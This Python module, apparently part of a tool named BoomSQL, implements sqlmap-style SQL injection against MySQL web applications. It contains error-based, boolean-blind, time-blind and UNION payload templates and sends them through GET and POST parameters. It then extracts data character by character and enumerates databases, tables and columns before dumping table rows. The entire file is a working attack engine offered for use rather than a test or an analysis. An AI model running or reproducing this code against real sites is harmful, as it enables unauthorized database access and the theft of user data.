"""
SQLMap Integration Module for BoomSQL
Direct integration of SQLMap techniques and payloads
"""

import asyncio
import re
import time
import random
from typing import Dict, List, Optional, Any, Union, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass
from enum import Enum

class SQLMapTechnique(Enum):
    """SQLMap injection techniques"""
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"

@dataclass
class SQLMapPayload:
    """SQLMap-style payload structure"""
    technique: SQLMapTechnique
    payload: str
    title: str
    dbms: str
    level: int
    risk: int
    clause: str
    
class SQLMapEngine:
    """SQLMap integration engine for BoomSQL"""
    
    def __init__(self, vulnerability, session):
        self.vulnerability = vulnerability
        self.session = session
        self.current_db = None
        self.dbms_version = None
        self.current_user = None
        
        # SQLMap-style payloads
        self.payloads = self.get_sqlmap_payloads()
        
    def get_sqlmap_payloads(self) -> Dict[SQLMapTechnique, List[SQLMapPayload]]:
        """Get SQLMap-style payloads for different techniques"""
        return {
            SQLMapTechnique.ERROR_BASED: [
                SQLMapPayload(
                    technique=SQLMapTechnique.ERROR_BASED,
                    payload="1 AND ExtractValue(0x0a,CONCAT(0x0a,({query})))",
                    title="MySQL >= 5.0 error-based - ExtractValue",
                    dbms="MySQL",
                    level=1,
                    risk=1,
                    clause="WHERE"
                ),
                SQLMapPayload(
                    technique=SQLMapTechnique.ERROR_BASED,
                    payload="1 AND UpdateXML(0x0a,CONCAT(0x0a,({query})),0x0a)",
                    title="MySQL >= 5.0 error-based - UpdateXML",
                    dbms="MySQL",
                    level=1,
                    risk=1,
                    clause="WHERE"
                ),
                SQLMapPayload(
                    technique=SQLMapTechnique.ERROR_BASED,
                    payload="1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
                    title="MySQL >= 5.0 error-based - GROUP BY",
                    dbms="MySQL",
                    level=2,
                    risk=1,
                    clause="WHERE"
                ),
                SQLMapPayload(
                    technique=SQLMapTechnique.ERROR_BASED,
                    payload="1 AND EXP(~(SELECT * FROM (SELECT CONCAT(({query})))a))",
                    title="MySQL >= 5.7 error-based - EXP",
                    dbms="MySQL",
                    level=2,
                    risk=1,
                    clause="WHERE"
                )
            ],
            SQLMapTechnique.BOOLEAN_BASED: [
                SQLMapPayload(
                    technique=SQLMapTechnique.BOOLEAN_BASED,
                    payload="1 AND (SELECT SUBSTRING(({query}),1,1))='{char}'",
                    title="MySQL >= 5.0 boolean-based blind",
                    dbms="MySQL",
                    level=1,
                    risk=1,
                    clause="WHERE"
                )
            ],
            SQLMapTechnique.TIME_BASED: [
                SQLMapPayload(
                    technique=SQLMapTechnique.TIME_BASED,
                    payload="1 AND IF((SELECT ASCII(SUBSTRING(({query}),{pos},1)))={ord_char},SLEEP(2),0)",
                    title="MySQL >= 5.0 time-based blind",
                    dbms="MySQL",
                    level=1,
                    risk=1,
                    clause="WHERE"
                )
            ],
            SQLMapTechnique.UNION_BASED: [
                SQLMapPayload(
                    technique=SQLMapTechnique.UNION_BASED,
                    payload="1 UNION ALL SELECT {query},NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
                    title="MySQL UNION query",
                    dbms="MySQL",
                    level=1,
                    risk=1,
                    clause="WHERE"
                )
            ]
        }
    
    async def detect_technique(self) -> Optional[SQLMapTechnique]:
        """Detect the best SQLMap technique for the target"""
        # Try error-based first (fastest)
        if await self.test_error_based():
            return SQLMapTechnique.ERROR_BASED
        
        # Try boolean-based
        if await self.test_boolean_based():
            return SQLMapTechnique.BOOLEAN_BASED
        
        # Try time-based (slowest but most reliable)
        if await self.test_time_based():
            return SQLMapTechnique.TIME_BASED
        
        return None
    
    async def test_error_based(self) -> bool:
        """Test if error-based injection works"""
        try:
            test_payload = "1 AND ExtractValue(0x0a,CONCAT(0x0a,(SELECT 'sqlmap_test')))"
            response = await self.execute_payload(test_payload)
            
            if response and 'sqlmap_test' in response:
                return True
                
        except Exception:
            pass
        
        return False
    
    async def test_boolean_based(self) -> bool:
        """Test if boolean-based injection works"""
        try:
            # Test true condition
            true_payload = "1 AND 1=1"
            true_response = await self.execute_payload(true_payload)
            
            # Test false condition
            false_payload = "1 AND 1=2"
            false_response = await self.execute_payload(false_payload)
            
            # If responses are different, boolean-based works
            if true_response and false_response and true_response != false_response:
                return True
                
        except Exception:
            pass
        
        return False
    
    async def test_time_based(self) -> bool:
        """Test if time-based injection works"""
        try:
            # Test with sleep
            sleep_payload = "1 AND SLEEP(2)"
            
            start_time = time.time()
            await self.execute_payload(sleep_payload)
            elapsed = time.time() - start_time
            
            # If response took more than 1.5 seconds, time-based works
            if elapsed > 1.5:
                return True
                
        except Exception:
            pass
        
        return False
    
    async def execute_payload(self, payload: str) -> Optional[str]:
        """Execute a SQLMap payload"""
        try:
            modified_url, modified_data, modified_headers, modified_cookies = self.prepare_request(payload)
            
            if self.vulnerability.injection_point.vector.name == "GET_PARAMETER":
                response = await self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies)
            elif self.vulnerability.injection_point.vector.name == "POST_PARAMETER":
                response = await self.session.post(modified_url, data=modified_data, headers=modified_headers, cookies=modified_cookies)
            else:
                return None
                
            content = await response.text()
            return content
            
        except Exception as e:
            print(f"Payload execution failed: {e}")
            return None
    
    def prepare_request(self, payload: str) -> Tuple[str, dict, dict, dict]:
        """Prepare request with SQLMap payload"""
        url = self.vulnerability.url
        injection_point = self.vulnerability.injection_point
        
        if injection_point.vector.name == "GET_PARAMETER":
            # Modify URL parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[injection_point.name] = [payload]
            query_string = urlencode(params, doseq=True)
            modified_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, query_string, parsed_url.fragment
            ))
            return modified_url, {}, {}, {}
        
        elif injection_point.vector.name == "POST_PARAMETER":
            return url, {injection_point.name: payload}, {}, {}
        
        return url, {}, {}, {}
    
    async def extract_data(self, query: str, technique: SQLMapTechnique = None) -> Optional[str]:
        """Extract data using SQLMap techniques"""
        if technique is None:
            technique = await self.detect_technique()
            
        if technique is None:
            return None
        
        if technique == SQLMapTechnique.ERROR_BASED:
            return await self.error_based_extract(query)
        elif technique == SQLMapTechnique.BOOLEAN_BASED:
            return await self.boolean_based_extract(query)
        elif technique == SQLMapTechnique.TIME_BASED:
            return await self.time_based_extract(query)
        
        return None
    
    async def error_based_extract(self, query: str) -> Optional[str]:
        """Extract data using error-based injection"""
        payloads = self.payloads[SQLMapTechnique.ERROR_BASED]
        
        for payload_obj in payloads:
            try:
                payload = payload_obj.payload.format(query=query)
                response = await self.execute_payload(payload)
                
                if response:
                    result = self.extract_from_error(response)
                    if result:
                        return result
                        
            except Exception:
                continue
        
        return None
    
    async def time_based_extract(self, query: str, max_length: int = 50) -> Optional[str]:
        """Extract data using time-based blind injection"""
        result = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # Try common characters
            chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._-@"
            
            for char in chars:
                payload = f"1 AND IF((SELECT ASCII(SUBSTRING(({query}),{pos},1)))={ord(char)},SLEEP(2),0)"
                
                start_time = time.time()
                await self.execute_payload(payload)
                elapsed = time.time() - start_time
                
                if elapsed > 1.5:
                    result += char
                    found_char = True
                    break
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.1)
            
            if not found_char:
                break
        
        return result if result else None
    
    async def boolean_based_extract(self, query: str, max_length: int = 50) -> Optional[str]:
        """Extract data using boolean-based blind injection"""
        result = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._-@"
            
            for char in chars:
                payload = f"1 AND (SELECT SUBSTRING(({query}),{pos},1))='{char}'"
                
                response = await self.execute_payload(payload)
                
                # Check if response indicates true condition
                if response and self.is_true_response(response):
                    result += char
                    found_char = True
                    break
            
            if not found_char:
                break
        
        return result if result else None
    
    def extract_from_error(self, content: str) -> Optional[str]:
        """Extract data from error messages"""
        patterns = [
            r'XPATH syntax error:\s*\'([^\']+)\'',
            r'~([^~]+)~',
            r'ERROR 1105.*?\'([^\']+)\'',
            r'Duplicate entry \'([^\']+)\' for key',
            r'UpdateXML.*?\'([^\']+)\'',
            r'Invalid XML.*?\'([^\']+)\'',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        return None
    
    def is_true_response(self, response: str) -> bool:
        """Check if response indicates true condition (for boolean-based)"""
        # This would need to be customized based on the specific target
        # For now, we'll use a simple heuristic
        return len(response) > 100  # Assuming true responses are longer
    
    # SQLMap-style database enumeration queries
    async def get_current_database(self) -> Optional[str]:
        """Get current database name"""
        query = "SELECT database()"
        return await self.extract_data(query)
    
    async def get_current_user(self) -> Optional[str]:
        """Get current user"""
        query = "SELECT user()"
        return await self.extract_data(query)
    
    async def get_version(self) -> Optional[str]:
        """Get database version"""
        query = "SELECT version()"
        return await self.extract_data(query)
    
    async def get_databases(self) -> Optional[List[str]]:
        """Get all databases"""
        query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '|') FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')"
        result = await self.extract_data(query)
        return result.split('|') if result else None
    
    async def get_tables(self, database: str = None) -> Optional[List[str]]:
        """Get tables from database"""
        if database:
            query = f"SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema='{database}'"
        else:
            query = "SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
        
        result = await self.extract_data(query)
        return result.split('|') if result else None
    
    async def get_columns(self, table: str, database: str = None) -> Optional[List[str]]:
        """Get columns from table"""
        if database:
            query = f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        else:
            query = f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
        
        result = await self.extract_data(query)
        return result.split('|') if result else None
    
    async def get_table_data(self, table: str, columns: List[str], limit: int = 100) -> Optional[List[Dict[str, str]]]:
        """Get data from table"""
        columns_str = ",".join(columns)
        query = f"SELECT GROUP_CONCAT(CONCAT_WS('|',{columns_str}) SEPARATOR '||') FROM {table} LIMIT {limit}"
        
        result = await self.extract_data(query)
        if not result:
            return None
        
        rows = []
        for row_data in result.split('||'):
            if row_data.strip():
                values = row_data.split('|')
                row = {}
                for i, col in enumerate(columns):
                    row[col] = values[i] if i < len(values) else ""
                rows.append(row)
        
        return rows
